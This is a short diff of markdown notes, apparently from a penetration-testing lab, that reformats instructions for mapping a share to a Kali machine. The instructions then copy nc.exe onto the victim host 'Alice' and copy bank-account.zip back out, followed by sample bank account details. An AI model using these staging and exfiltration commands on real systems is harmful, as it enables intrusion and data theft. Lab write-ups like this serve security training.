@@ -13,11 +13,9 @@ On Alice:
 net use * \\IP\\richeeta
 ```
 
-Then use:
-```
-copy z:\nc.exe # This will bring nc.exe from Kali to Alice
-copy c:\bank-account.zip z:\bank-account.zip # This will move bank-account.zip from Alice to Kali
-```
+Then on Alice:
+`copy z:\nc.exe` to bring nc.exe from Kali to Alice and
+`copy c:\bank-account.zip z:\bank-account.zip` to move bank-account.zip from Alice to Kali
 
 Bank	Gold Swiss
 Acct #	2342364-KIETGGE-298074
